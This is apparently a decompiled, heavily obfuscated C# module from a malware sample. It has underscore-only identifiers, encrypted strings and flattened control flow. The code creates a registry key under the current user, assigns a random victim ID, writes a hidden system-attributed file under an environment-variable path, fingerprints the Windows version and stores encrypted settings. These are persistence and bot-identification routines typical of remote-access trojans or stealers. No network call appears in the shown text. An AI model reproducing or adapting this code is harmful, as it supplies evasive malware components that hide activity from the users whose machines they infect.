using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using System;
using System.IO;

[StandardModule]
internal sealed class __________________________________________________________________
{
	private static RegistryKey _;

	public static void _()
	{
		try
		{
			__________________________________________________________________._ = Registry.CurrentUser.OpenSubKey(<Module>.______<string>(-255444469), true);
			if (__________________________________________________________________._ == null)
			{
				Registry.CurrentUser.CreateSubKey(<Module>.___<string>(1496711269));
			}
			__________________________________________________________________.__();
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			__________________________________________________________________.__();
			ProjectData.ClearProjectError();
		}
	}

	public static void __()
	{
		int num;
		string str = null;
		int num1 = 0;
		int length;
		Random random = new Random();
		try
		{
			num = random.Next(100000, 999999);
			______________________________________________________________._______________________ = num.ToString();
			______________________________________________________________.________________________ = Conversions.ToString(Operators.ConcatenateObject(string.Concat(string.Concat(string.Concat(______________________________________________________________.____________________, <Module>.____<string>(-606320000)), ______________________________________________________________._______________________), <Module>._____<string>(640941012)), __________________________________________________________________.___()));
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
		try
		{
			string str1 = __________________________________________________________________.____(<Module>.____<string>(1706502227));
			if (Operators.CompareString(str1, string.Empty, false) == 0)
			{
				length = ((num1 << 12) + -28389376 == -9375744 * num1 ? Type.EmptyTypes.Length + 1778100780 : Type.EmptyTypes.Length + 3);
				while (true)
				{
					switch (length)
					{
						case 0:
						{
							break;
						}
						case 1:
						{
							if (!File.Exists(str))
							{
								______________________._______ = -2051646939;
								string str2 = <Module>.______<string>(-1895663730);
								num = random.Next(100000, 999999);
								__________________________________________________________________._____(str2, num.ToString());
								length = Type.EmptyTypes.Length + 0;
								continue;
							}
							else
							{
								str1 = File.ReadAllText(str);
								__________________________________________________________________._____(<Module>._____<string>(-379776325), str1);
								length = Type.EmptyTypes.Length + 2;
								continue;
							}
						}
						case 2:
						{
							goto Label0;
						}
						case 3:
						{
							str = string.Concat(Environment.GetEnvironmentVariable(<Module>._______<string>(-1763685418)), <Module>._______<string>(-867954375), ______________________________________________________________.__________________);
							length = Type.EmptyTypes.Length + 1;
							continue;
						}
						default:
						{
							goto case 3;
						}
					}
				}
				str1 = __________________________________________________________________.____(<Module>._______<string>(1015702035));
				File.WriteAllText(str, str1);
				(new FileInfo(str)).Attributes = FileAttributes.System;
			}
		Label0:
			______________________________________________________________._______________________ = str1;
			______________________________________________________________.________________________ = Conversions.ToString(Operators.ConcatenateObject(string.Concat(string.Concat(string.Concat(______________________________________________________________.____________________, <Module>._____<string>(640941012)), str1), <Module>.______<string>(1224865621)), __________________________________________________________________.___()));
			try
			{
				if (Operators.CompareString(__________________________________________________________________.____(<Module>.____<string>(2012484535)), string.Empty, false) != 0)
				{
					______________________________________________________________.________________________ = __________________________________________________________________.____(<Module>.___<string>(1624166418));
				}
			}
			catch (Exception exception1)
			{
				ProjectData.SetProjectError(exception1);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception exception2)
		{
			ProjectData.SetProjectError(exception2);
			string str3 = <Module>._______<string>(1015702035);
			num = random.Next(100000, 999999);
			__________________________________________________________________._____(str3, num.ToString());
			______________________________________________________________._______________________ = __________________________________________________________________.____(<Module>._____<string>(-379776325));
			ProjectData.ClearProjectError();
		}
	}

	public static object ___()
	{
		object obj;
		try
		{
			string oSFullName = C.bzA.Info.OSFullName;
			if (!oSFullName.Contains(<Module>.___<string>(-1313721977)))
			{
				if (oSFullName.Contains(<Module>._______<string>(648985584)))
				{
					if (Type.EmptyTypes.Length + 5817 == 5817)
					{
						obj = <Module>.____<string>(-592742704);
						return obj;
					}
				}
				else if (oSFullName.Contains(<Module>._____<string>(1820338794)))
				{
					int ______ = <Module>.A;
					(______ & ~______ & -9809) != 0;
					obj = <Module>._____<string>(314210858);
					return obj;
				}
				else if (oSFullName.Contains(<Module>._______<string>(868075776)))
				{
					switch (sizeof(long))
					{
						default:
						{
							obj = <Module>.___<string>(730375383);
							return obj;
						}
					}
				}
				else if (oSFullName.Contains(<Module>.___<string>(-426166883)))
				{
					obj = <Module>.______<string>(-1589726945);
					return obj;
				}
				else if (!oSFullName.Contains(<Module>.___<string>(1288333701)))
				{
					obj = <Module>._______<string>(339061184);
					return obj;
				}
				else
				{
					obj = <Module>.___<string>(669765779);
					return obj;
				}
			}
			obj = <Module>.___<string>(-1313721977);
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			obj = <Module>.____<string>(-2125572658);
			ProjectData.ClearProjectError();
		}
		return obj;
	}

	public static string ____(string string_0)
	{
		string empty;
		try
		{
			string str = Conversions.ToString(__________________________________________________________________._.GetValue(___________________________________________________________________.____(string_0)));
			int _________ = <Module>._________________;
			empty = ___________________________________________________________________._(str, <Module>.__________(((_________ ^ 4230) - 20688 != _________ + 88 * _________ + _________ * 40 ? Type.EmptyTypes.Length + 3516 : Type.EmptyTypes.Length + 922089547), (262144 * -(536275456 * _________) - 1308622848 == _________ / 708 ? checked((int)1769399897) : Type.EmptyTypes.Length + 6177), (int)(sizeof(float) + 98)));
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			empty = string.Empty;
			ProjectData.ClearProjectError();
		}
		return empty;
	}

	public static void _____(string string_0, string string_1)
	{
		try
		{
			__________________________________________________________________._.SetValue(___________________________________________________________________.____(string_0), ___________________________________________________________________.____(string_1));
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}

	public static void ______(string string_0, string string_1)
	{
		try
		{
			string str = ___________________________________________________________________._(Conversions.ToString(__________________________________________________________________._.GetValue(___________________________________________________________________.____(string_0))), <Module>.__________((int)(sizeof(ulong) + 54070), Type.EmptyTypes.Length + 54468, 193));
			string str1 = string.Concat(str, string_1);
			__________________________________________________________________._.SetValue(___________________________________________________________________.____(string_0), ___________________________________________________________________.____(str1));
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}
}